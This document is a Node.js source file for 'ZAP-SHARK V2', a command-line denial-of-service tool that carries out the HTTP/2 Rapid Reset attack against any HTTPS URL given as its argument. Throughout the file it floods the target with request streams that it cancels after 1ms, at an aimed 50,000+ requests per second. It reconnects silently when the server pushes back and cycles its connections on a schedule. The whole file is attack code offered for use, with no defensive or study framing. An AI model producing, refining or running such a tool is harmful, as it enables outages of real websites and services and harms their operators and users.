const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // RAPID RESET + KEEPALIVE OPTIMIZATION
        this.connectionPool = [];
        this.poolSize = 3; // Fewer but persistent connections
        this.maxStreamsPerConn = 1000; // H2 max
        this.activeStreams = 0;
        this.rapidResetMode = true;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.attackInterval = null;
        this.statsInterval = null;
    }

    async setupConnections() {
        for (let i = 0; i < this.poolSize; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 65536,
                    maxDeflateDynamicTableSize: 65536,
                    peerMaxConcurrentStreams: 1000
                });
                
                // KEEPALIVE: Keep connection alive forever
                client.socket.setKeepAlive(true, 60000);
                client.socket.setNoDelay(true);
                
                client.on('connect', () => {
                    console.log(`[+] H2 Connection ${i+1} established (KeepAlive)`);
                });
                
                client.on('error', (err) => {
                    // Silent reconnect
                    setTimeout(() => this.createSingleConnection(), 1000);
                });
                
                client.on('goaway', () => {
                    // Server sent goaway, recreate
                    setTimeout(() => this.createSingleConnection(), 500);
                });
                
                this.connectionPool.push(client);
                
                // Stagger connections
                await new Promise(resolve => setTimeout(resolve, 200));
                
            } catch (err) {
                // Continue silently
            }
        }
    }

    createSingleConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                peerMaxConcurrentStreams: 1000
            });
            client.socket.setKeepAlive(true, 60000);
            client.socket.setNoDelay(true);
            client.on('error', () => {});
            this.connectionPool.push(client);
        } catch (err) {}
    }

    sendRequest() {
        if (this.connectionPool.length === 0) return;

        // Use all available connections
        const connections = this.connectionPool.length;
        const streamsPerTick = Math.min(100, connections * 10); // Aggressive but safe
        
        for (let i = 0; i < streamsPerTick; i++) {
            const client = this.connectionPool[i % connections];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                // Create stream
                const stream = client.request({
                    ':method': 'GET',
                    ':path': '/?' + Math.random().toString(36).substr(2),
                    ':authority': this.hostname,
                    'user-agent': 'Mozilla/5.0',
                    'accept': '*/*'
                });
                
                // RAPID RESET: Cancel immediately
                if (this.rapidResetMode) {
                    // Send request then immediately reset
                    stream.end();
                    
                    // Cancel after 1ms (before server responds)
                    setTimeout(() => {
                        try {
                            stream.close(http2.constants.NGHTTP2_CANCEL);
                        } catch (err) {
                            // Stream already closed
                        }
                        this.activeStreams--;
                        this.totalRequests++;
                        this.requestsSinceLastCalc++;
                    }, 1); // 1ms delay for reset
                    
                } else {
                    // Normal mode (for comparison)
                    stream.on('response', () => {
                        stream.destroy();
                        this.activeStreams--;
                        this.totalRequests++;
                        this.requestsSinceLastCalc++;
                    });
                    
                    stream.on('error', () => {
                        this.activeStreams--;
                        this.totalRequests++;
                        this.requestsSinceLastCalc++;
                    });
                    
                    stream.end();
                }
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const mode = this.rapidResetMode ? '[RAPID-RESET]' : '[NORMAL]';
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
                           `${mode} CONNS: ${this.connectionPool.length}`);
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns >nul 2>&1', () => {});
        } else {
            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null || true', () => {});
        }
    }

    flushSockets() {
        // Close connections but maintain pool size
        this.connectionPool.forEach(client => {
            try {
                client.destroy();
            } catch (err) {}
        });
        this.connectionPool = [];
        this.activeStreams = 0;
        
        // Recreate connections
        setTimeout(() => this.setupConnections(), 1000);
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            console.log('\n⚡ MAINTENANCE STARTED (10min)');
            this.status = "PAUSED";
            
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                console.log('⚡ MAINTENANCE COMPLETED - RAPID RESET ENGAGED');
                this.startAttack();
            }, this.maintenanceDuration);
        }
    }

    startAttack() {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        // ULTRA FAST INTERVAL for rapid reset
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                // Send in bursts for max RPS
                for (let burst = 0; burst < 5; burst++) {
                    this.sendRequest();
                }
                this.updateDisplay();
            }
        }, 0.05); // 20,000 iterations/sec
    }

    async start() {
        console.log("=".repeat(50));
        console.log("🦈 ZAP-SHARK V2 - RAPID RESET EDITION");
        console.log("=".repeat(50));
        console.log("Target:", this.targetUrl);
        console.log("Mode: HTTP/2 Rapid Reset + KeepAlive");
        console.log("Expected RPS: 50,000+");
        console.log("=".repeat(50));
        
        await this.setupConnections();
        
        // Wait for connections
        setTimeout(() => {
            this.startAttack();
        }, 3000);
        
        // Maintenance checker
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // Connection health monitor
        setInterval(() => {
            if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
                this.createSingleConnection();
            }
        }, 5000);
        
        // Stats display
        this.statsInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                console.log(`\n📊 STATS: ${this.currentRPS.toFixed(0)} RPS | Connections: ${this.connectionPool.length} | Total: ${this.totalRequests}`);
            }
        }, 10000);
        
        process.on('SIGINT', () => this.stop());
    }

    stop() {
        this.running = false;
        if (this.attackInterval) clearInterval(this.attackInterval);
        if (this.statsInterval) clearInterval(this.statsInterval);
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        console.log('\n\n🦈 ZAP-SHARK TERMINATED');
        process.exit(0);
    }
}

// CLI
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v2.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start().catch(console.error);
